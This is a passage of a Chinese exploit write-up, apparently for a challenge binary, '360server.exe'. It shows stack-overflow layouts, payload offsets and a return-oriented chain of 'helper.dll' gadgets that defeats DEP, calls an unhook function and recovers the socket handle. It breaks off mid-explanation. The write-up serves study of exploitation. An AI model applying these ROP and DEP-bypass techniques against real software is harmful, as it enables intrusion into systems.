
# 堆栈布局

`ebp` | 上一层函数的 `EBP` | | |  
| .... | | | |  
| .... | | | |  
`ebp-110` | `ClientXXXXXXXX` | | `XXXXXXXXX` 开始的位置对应到 数据包的偏移 24 开始 |  

## 第二步 分析 `shellcode` 需要完成的功能需求

由于系统开启了 `DEP` 保护功能，并且 `360server.exe` 调用了 `SetProcessDEPPolicy` 这个函数开启了进程的 `DEP` 保护，所以数据段和堆栈段都不能执行代码，首先要解决数据或堆栈段可执行的问题。

第二个需求读取 `c:\\360.txt` 文件问题。`360server.exe` 通过调用 `helper.dll` 中的函数与 `bprot.sys` 驱动通讯，拒绝访问 `c:\\360.txt`。

同时我们也看到 `helper.dll` 中也提供了一个 `unHook` 导出函数，去除对 `c:\\360.txt` 文件的访问保护。第二个需求就是我们的 `shellcode` 需要去调用 `helper.dll` 中的 `unHook` 函数。同时我们也发现 `360server.exe` 调用了 `helper.dll` 中的 `Helpyou` 的一个导出函数。在 `Helpyou` 函数中调用 `VirtualProtect` 函数，`VirtualProtect` 函数可以改变数据段或堆栈段的属性，让这些段变成可执行的段

我们也可以发现 `helper.dll` 的模块基地址是 `41410000` 开始，这就让我们可以把这个模块中的地址放到 溢出的堆栈中，`402600` 函数执行到反回时，跳转到 `helper.dll` 中的某个地址执行指令。例如：

`ebp+40` | `socket handle` | | 这个 `socket` 句柄将要被覆盖  
| .... | | |  
`ebp+1c` | 上层函数的局域变量开始 | |  
`ebp+18` | 函数 `0x402600` 参数 4 | |  
`ebp+14` | 函数 `0x402600` 参数 4 | |  
`ebp+10` | 函数 `0x402600` 参数 3 | |  
`ebp+c` | 函数 `0x402600` 参数 2 | |  
`ebp+8` | 函数 `0x402600` 参数 1 | |  
`ebp+4` | `call return address` | | 我们可以在第 294 个字节开始的 `Dword` 设置为 `unHook` 的地址 |  
| `0x00402b35` | | |  
`ebp` | 上一层函数的 `EBP` | |  
| .... | | |  
| .... | | |  
`ebp-110` | `ClientXXXXXXXX` | | `XXXXXXXXX` 开始的位置对应到 数据包的偏移 24 开始 |  

```asm
.text:00402600                  push    ebp
.text:00402601                  mov     ebp, esp
.text:00402603                  sub     esp, 550h
.text:00402609                  mov     [ebp+var_4], 0
                               .....
                               .....
.text:0040278C                  mov     esp, ebp
.text:0040278E                  pop     ebp
.text:0040278F                  retn
```

在上面的堆栈情况下 当指令执行到 `403600` 函数的返回语句 `40278f` 的 `ret` 的时候，`cpu` 将要去执行 `unHook` 函数

我们可以通过在堆栈中放入 代码段的地址，来达到控制 `cpu` 的目的。为了解决第一个需求问题，我们就需要构造一个 `VirtualProtect` 函数调用，

第三个需求 在利用漏洞的时候只能使用 `3600` 这个 `socket` 端口传送数据。也就是说我们必须使用程序原始的 `socket` 端口，但是我们不难发现在 `ebp+40` 的堆栈位置中保存的是原始的 `socket` 句柄。我们很难在 `ebp` 到 `ebp+40` 的这 64 个字节中完成所有的功能，这里必然是要被我们的 `shellcode` 覆盖的。那我们如何使用原始的 `socket` 句柄呢，那只能使用曲线救国的办法。我们从 `0` 到 `ffffffff` 测试 `socket` 端口的可用性，都过调用 `sent` 判断返回值的方法，去找回原始的 `socket`. 种方法可以解决这个问题

第四个需求 如何精确定位自己的 `shellcode` 代码的问题。也就是说我们如果成功的构造了 `VirtualProtect` 的函数掉用。如果去跳转到你的 `shellcode`. 因为我们的 `shellcode` 都保存在堆栈中，在堆栈的 `ebp-110` 开始的 1024 个自己处，为了精确去定位自己的 `shellcode`, 我们必须获得溢出时的 `esp` 寄存器的值。因为在执行 `VirtualProtect` 函数前，我们无法在堆栈中直接执行我们的 `shllcode` 的。只能工作在堆栈的某些位置放入 `helper.dll` 的某些执行地址，然后继续精确控制地址的返回，来调整堆栈中的数据方式。控制 `cpu` 流程。

我们能可以找到 `helper.dll` 中的 `414129c8` 开始的代码片段，可以把当前的 `esp` 保存到 `fs:0` 中。就是说只要我们把 `402600` 函数返回地址覆盖成 `414129c8`, 我就相当于调用了 保存 `esp` 到 `fs:0` 的功能。

```asm
.text:414129C8                  lea     ebp, [esp+8+arg_4]
.text:414129CC                  sub     esp, eax                  //这里 eax 必须是 0
.text:414129CE                  push    ebx
.text:414129CF                  push    esi
.text:414129D0                  push    edi
.text:414129D1                  mov     eax, ___security_cookie
.text:414129D6                  xor     [ebp-4], eax
.text:414129D9                  xor     eax, ebp
.text:414129DB                  push    eax
.text:414129DC                  mov     [ebp-18h], esp
.text:414129DF                  push    dword ptr [ebp-8]
.text:414129E2                  mov     eax, [ebp-4]
.text:414129E5                  mov     dword ptr [ebp-4], 0FFFFFFFEh
.text:414129EC                  mov     [ebp-8], eax
.text:414129EF                  lea     eax, [ebp-10h]
.text:414129F2                  mov     large fs:0, eax
.text:414129F8                  retn
```

上面的代码调用的时候如何保证 `eax` 的值零呢。同样我们可以在 `helper.dll` 中找到下面的代码片段

```asm
.text:41418938                  xor     eax, eax
.text:4141893A                  retn
```

如果我们在溢出点的堆栈中放入下面的数据就能完成上面需要的功能

`esp+18` | 下条指令地址 | |  
`esp+14` | `xxxxxxxxxx` | |  
`esp+10` | `0x41411301` | |  
`esp+c` | `xxxxxxxxxx` | |  
`esp+8` | `xxxxxxxxxx` | |  
`esp+4` | `0x414129c8` | |  
溢出点 `esp` | `0x41418938` | | 数据包偏移的第 294 字节开始将覆盖掉上层函数调用的返回地址 |

上面的堆栈情况在 `.text:0040278F retn` 被执行的时候

将执行以下的执行序列：

```asm
.text:41418938                  xor     eax, eax
.text:4141893A                  retn                  //这个 ret 执行的时候 esp 对应到 [溢出点+4] 0x414129c8
.text:414129C8                  lea     ebp, [esp+8+arg_4]
.text:414129CC                  sub     esp, eax                  //这里 eax 必须是 0
.text:414129CE                  push    ebx
.text:414129CF                  push    esi
.text:414129D0                  push    edi
.text:414129D1                  mov     eax, ___security_cookie
.text:414129D6                  xor     [ebp-4], eax
.text:414129D9                  xor     eax, ebp
.text:414129DB                  push    eax
.text:414129DC                  mov     [ebp-18h], esp
.text:414129DF                  push    dword ptr [ebp-8]
.text:414129E2                  mov     eax, [ebp-4]
.text:414129E5                  mov     dword ptr [ebp-4], 0FFFFFFFEh
.text:414129EC                  mov     [ebp-8], eax
.text:414129EF                  lea     eax, [ebp-10h]
.text:414129F2                  mov     large fs:0, eax
.text:414129F8                  retn                //这个 ret 执行的时候 堆栈中的数据是 0x41411301
.text:41411302                  add     esp, 1Ch
.text:41411305                  retn                //这个 ret 执行的时候 堆栈中的数据是 "下条指令地址"
```

通过溢出堆栈中的数据 控制 `cpu` 的流程就是想上面那样完成的。

控制 `cpu` 流程的原理大家已经清楚了。接下来就是在 `helper.dll` 中发现某系地址，通过这些地址完成某些你需要完成的功能。例如给 寄存器 `eax`,`ebx`,`ecx`,`edx`,`esi`,`edi` 赋值等。

同时你可以把这些地址定义成函数。这样便于写 `shellcode` 的时候去引用这些功能。

你可在我写的 `python` 的代码中，找到我在 `helper.dll` 中定位到的一些特定地址。

例如：

`set_eax(val)`

```asm
.text:4141294A                  pop     eax
.text:4141294B                  pop     ebp
.text:4141294C                  retn
```

`set_ebx(val)`

```asm
.text:41419E93                  pop     ebx
.text:41419E94                  retn
```

如果想为 `eax` 设置一个值为 `0x50404046` 你只要在堆栈中构造如下数据就可以了
